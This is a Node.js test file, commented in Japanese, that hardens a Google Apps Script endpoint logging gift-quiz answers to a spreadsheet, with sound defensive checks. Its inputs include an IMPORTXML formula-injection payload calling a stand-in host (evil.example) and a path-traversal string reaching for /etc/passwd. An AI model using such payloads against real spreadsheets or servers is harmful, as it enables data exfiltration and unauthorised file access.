/*
 * tools/apps-script.gs の検査・無害化まわりのテスト。
 *
 * 受け口のURLは公開ページのソースから読めてしまうので、
 * 「知らない相手にPOSTされる」前提で、変なものを投げて確かめる。
 * Google 側のサービスは差し替えて、node の中だけで動かす。
 *
 *   node test/apps-script.test.mjs
 */

import fs from 'node:fs';
import path from 'node:path';
import vm from 'node:vm';
import { execFileSync } from 'node:child_process';
import { fileURLToPath } from 'node:url';

const ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..');
const SOURCE = fs.readFileSync(path.join(ROOT, 'tools/apps-script.gs'), 'utf8');

const failures = [];
const check = (label, ok) => {
  if (!ok) failures.push(label);
  console.log(`  ${ok ? '✓' : '✗'} ${label}`);
};

/** Google のサービスを差し替えて、スクリプトを1つ動かす */
function load({ token = '', email = '', header = null } = {}) {
  const source = SOURCE
    .replace("const SHARED_TOKEN = '';", `const SHARED_TOKEN = ${JSON.stringify(token)};`)
    .replace("const NOTIFY_EMAIL = '';", `const NOTIFY_EMAIL = ${JSON.stringify(email)};`);

  const rows = [];
  const mails = [];
  const cache = new Map();
  const props = new Map();

  /* シート1枚ぶんのふるまい。行は rows と同じ配列を共有する */
  const makeSheet = (name, store) => ({
    name,
    rows: store,
    getName: () => name,
    setName: (next) => { renames.push([name, next]); name = next; },
    getLastRow: () => store.length,
    getLastColumn: () => store.reduce((max, r) => Math.max(max, r.length), 0),
    appendRow: (row) => { store.push(row.slice()); },
    setFrozenRows: () => {},
    getRange: (row, col, numRows = 1, numCols = 1) => ({
      getValue: () => (store[row - 1] || [])[col - 1],
      setValue: (value) => { (store[row - 1] || [])[col - 1] = value; },
      getValues: () => {
        const out = [];
        for (let i = 0; i < numRows; i++) {
          const source = store[row - 1 + i] || [];
          const line = [];
          for (let j = 0; j < numCols; j++) line.push(source[col - 1 + j]);
          out.push(line);
        }
        return out;
      },
      setValues: (values) => {
        for (let j = 0; j < numCols; j++) store[row - 1][col - 1 + j] = values[0][j];
      }
    })
  });

  const renames = [];
  let sheet = makeSheet('answers', rows);

  const context = {
    console: { error: () => {} },
    SpreadsheetApp: {
      getActiveSpreadsheet: () => ({
        getSheetByName: () => sheet,
        insertSheet: (name) => { rows.length = 0; sheet = makeSheet(name, rows); return sheet; }
      })
    },
    CacheService: {
      getScriptCache: () => ({
        get: (k) => (cache.has(k) ? cache.get(k) : null),
        put: (k, v) => cache.set(k, v)
      })
    },
    PropertiesService: {
      getScriptProperties: () => ({
        getProperty: (k) => (props.has(k) ? props.get(k) : null),
        setProperty: (k, v) => props.set(k, v)
      })
    },
    LockService: { getScriptLock: () => ({ tryLock: () => true, releaseLock: () => {} }) },
    MailApp: { sendEmail: (to, subject, body) => mails.push({ to, subject, body }) },
    Utilities: { formatDate: (d, tz, fmt) => (fmt.includes('HH') ? '20260916-013000' : '2026-09-16') },
    ContentService: { createTextOutput: (text) => ({ text }) }
  };

  vm.createContext(context);
  /* const 宣言は context に生えないので、使うものだけ渡してもらう */
  vm.runInContext(
    source + ';globalThis.__headers = HEADERS; globalThis.__doPost = doPost;',
    context
  );

  /* ヘッダー行を先に置いておく（本物のシートと同じ状態にする） */
  rows.push(header ? header.slice() : context.__headers.slice());

  const post = (body) =>
    context.__doPost({ postData: { contents: typeof body === 'string' ? body : JSON.stringify(body) } });

  return {
    post, rows, mails, renames,
    headers: () => context.__headers.slice(),
    header: () => rows[0],
    dataRows: () => rows.slice(1)
  };
}

const validPayload = (over = {}) => ({
  sessionId: 'aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee',
  answeredCount: 3,
  finished: false,
  message: '',
  keywords: ['甘いもの好き'],
  answers: [{ question: '甘いものは好きですか？', answer: '大好き' }],
  journal: ['0秒 はじめた', '12秒 答えた：甘いもの'],
  ranking: [{ name: 'お取り寄せスイーツの詰め合わせ' }],
  picked: null,
  ...over
});

console.log('\n=== 受け口の検査 ===');

/* ふつうの回答は通る */
{
  const app = load();
  app.post(validPayload());
  check('ふつうの回答は1行書かれる', app.dataRows().length === 1);
  check('回答の中身がそのまま入る', app.dataRows()[0][7] === 'お取り寄せスイーツの詰め合わせ');
}

/* 同じセッションは行が増えず、上書きされる */
{
  const app = load();
  app.post(validPayload({ answeredCount: 1 }));
  app.post(validPayload({ answeredCount: 2 }));
  app.post(validPayload({ answeredCount: 3 }));
  check('同じ回答者は1行のまま上書きされる', app.dataRows().length === 1);
  check('最後の状態が残る', app.dataRows()[0][2] === 3);
}

/* 数式インジェクション */
{
  const app = load();
  const attacks = [
    '=IMPORTXML("http://evil.example/x","//a")',
    '+1+1',
    '-2+3',
    '@SUM(A1:A9)'
  ];
  attacks.forEach((attack, i) => {
    app.post(validPayload({
      sessionId: `session-formula-${i}0000000`,
      picked: { name: attack },
      message: attack
    }));
  });
  const cells = app.dataRows().flatMap((row) => [row[4], row[5]]);   // 選んだもの / ひとこと
  check('数式として解釈される文字列は先頭に \' がついて無害化される',
    cells.length === 8 && cells.every((c) => typeof c === 'string' && c.startsWith("'")));
  check('無害化しても中身は読める', cells[0].includes('IMPORTXML'));
}

/* 金額はどこにも出さない方針なので、送られてきても捨てる */
{
  const app = load();
  app.post(validPayload({
    picked: { name: 'スイーツ', budget: '5,000円' },
    ranking: [{ name: 'スイーツ', budget: '5,000円' }]
  }));
  const row = app.dataRows()[0];
  check('列に「目安」が無い', !app.rows[0].includes('目安'));
  check('金額を送りつけられてもシートに入らない',
    row.every((cell) => typeof cell !== 'string' || !cell.includes('5,000円')));
}

/* 迷った跡 */
{
  const app = load();
  app.post(validPayload({
    journal: ['0秒 はじめた', '30秒 もどった：甘いもの を取り消した', '48秒 ほかの候補を見た：家電、マッサージ機 を見送った']
  }));
  const trail = app.dataRows()[0][11];
  check('迷った跡が専用の列に入る', typeof trail === 'string' && trail.includes('もどった'));
  check('見送った候補も残る', trail.includes('見送った'));
  check('できごとが1行ずつ並ぶ', trail.split(String.fromCharCode(10)).length === 3);
}

/* 迷った跡の量を制限する（本文の長さの上限には収まる範囲で） */
{
  const app = load();
  app.post(validPayload({
    journal: Array.from({ length: 200 }, (_, i) => `${i}秒 答えた：えらんだ`)
  }));
  check('迷った跡は80件までに切られる',
    app.dataRows()[0][11].split(String.fromCharCode(10)).length === 80);
}
{
  const app = load();
  app.post(validPayload({
    journal: Array.from({ length: 10 }, () => 'ぜ'.repeat(300))
  }));
  const trail = app.dataRows()[0][11].split(String.fromCharCode(10));
  check('1件あたりの長さも切られる', trail.every((line) => line.length <= 121));
}

/* 列の構成が変わったら、古いシートを残して作り直す */
{
  const app = load({ header: ['更新日時', 'セッション', '回答数', '選んだもの'] });
  app.post(validPayload());
  check('古い列構成のシートは名前を変えて退避される',
    app.renames.length === 1 && app.renames[0][1].startsWith('answers_old_'));
  check('新しい列構成で作り直される',
    JSON.stringify(app.header()) === JSON.stringify(app.headers()));
  check('作り直したあと、ちゃんと書き込める', app.dataRows().length === 1);
}

/* 合言葉 */
{
  const app = load({ token: 'himitsu' });
  app.post(validPayload());
  check('合言葉が無いPOSTは捨てられる', app.dataRows().length === 0);
  app.post(validPayload({ token: 'chigau' }));
  check('合言葉が違うPOSTは捨てられる', app.dataRows().length === 0);
  app.post(validPayload({ token: 'himitsu' }));
  check('合言葉が合えば通る', app.dataRows().length === 1);
}

/* 壊れた入力 */
{
  const app = load();
  app.post('これはJSONではありません');
  app.post('null');
  app.post('[1,2,3]');
  app.post(validPayload({ sessionId: 'short' }));
  app.post(validPayload({ sessionId: '../../../etc/passwd' }));
  app.post(validPayload({ sessionId: 'x'.repeat(200) }));
  app.post(validPayload({ sessionId: 42 }));
  check('壊れた入力・おかしなセッションIDは、すべて捨てられる', app.dataRows().length === 0);
  app.post(validPayload());
  check('そのあと正しいものを送れば通る', app.dataRows().length === 1);
}

/* 大きすぎる本文 */
{
  const app = load();
  app.post(validPayload({ message: 'あ'.repeat(20000) }));
  check('大きすぎる本文は受け取らない', app.dataRows().length === 0);
}

/* 長さの切りつめ */
{
  const app = load();
  /* 本文の長さの上限（8000字）には収まるが、項目ごとには長すぎるもの */
  app.post(validPayload({
    message: 'ぜ'.repeat(500),
    keywords: Array.from({ length: 50 }, (_, i) => `キーワード${i}`),
    answers: Array.from({ length: 40 }, () => ({ question: 'Q'.repeat(60), answer: 'A'.repeat(60) }))
  }));
  const row = app.dataRows()[0];
  check('ひとことは400字ほどで切られる', row[5].length <= 401);
  check('キーワードは10個までに切られる', row[6].split('、').length === 10);
  check('回答は20問までに切られる', row[10].split(String.fromCharCode(10)).length === 20);
}

/* 回数制限 */
{
  const app = load();
  for (let i = 0; i < 80; i++) app.post(validPayload({ answeredCount: i }));
  check('同じ回答者からの連続POSTは60回で止まる', app.dataRows()[0][2] === 59);
}

/* 行数の上限 */
{
  const app = load();
  for (let i = 0; i < 305; i++) {
    app.post(validPayload({ sessionId: `flood-${String(i).padStart(10, '0')}` }));
  }
  check('作れる行数は300で頭打ちになる', app.dataRows().length === 300);
}

/* メール */
{
  const app = load({ email: 'me@example.com' });
  app.post(validPayload({ finished: false }));
  check('途中の回答ではメールしない', app.mails.length === 0);

  app.post(validPayload({ finished: true, picked: { name: 'スイーツ' } }));
  check('選び終わったらメールする', app.mails.length === 1);

  app.post(validPayload({ finished: true, picked: { name: 'スイーツ' } }));
  check('同じ回答者に二重にメールしない', app.mails.length === 1);

  for (let i = 0; i < 40; i++) {
    app.post(validPayload({ sessionId: `mail-${String(i).padStart(10, '0')}`, finished: true }));
  }
  check('メールは1日20通で止まる', app.mails.length === 20);
  check('メール本文に注意書きが入る', app.mails[0].body.includes('リンクは開かないでください'));
}

/* git に入るファイルに、送信先のURLや合言葉が紛れこんでいないか */
console.log('\n=== うっかりコミットの見張り ===');
{
  const tracked = execFileSync('git', ['ls-files'], { cwd: ROOT, encoding: 'utf8' })
    .split('\n')
    .filter(Boolean);

  const patterns = [
    [/script\.google\.com\/macros\/s\/[A-Za-z0-9_-]{10,}/, 'Apps Script のウェブアプリURL'],
    [/\b(REPORT_ENDPOINT|REPORT_TOKEN|SHARED_TOKEN)\s*=\s*['"][^'"]+['"]/, '埋めこまれた送信先の設定']
  ];

  /* 値を組み立てている行（ワークフローなど）は、値そのものではないので見逃す */
  const isGenerator = (line) =>
    line.includes('process.env') || line.includes('js(') ||
    line.includes('secrets.') || line.includes('${');

  const hits = [];
  for (const file of tracked) {
    let text;
    try {
      text = fs.readFileSync(path.join(ROOT, file), 'utf8');
    } catch {
      continue;   // バイナリなどは飛ばす
    }
    text.split('\n').forEach((line, i) => {
      if (isGenerator(line)) return;
      for (const [pattern, label] of patterns) {
        if (pattern.test(line)) hits.push(`${file}:${i + 1} ${label}`);
      }
    });
  }

  check('git に入るファイルに送信先URL・合言葉が無い', hits.length === 0);
  hits.forEach((hit) => console.log(`      ${hit}`));

  check('assets/config.js は git に入っていない', !tracked.includes('assets/config.js'));
  check('assets/config.example.js は git に入っている', tracked.includes('assets/config.example.js'));
}

console.log('\n' + (failures.length
  ? `❌ 通らなかった項目:\n${failures.map((f) => '  - ' + f).join('\n')}`
  : '✅ すべて通りました'));
process.exit(failures.length ? 1 : 0);
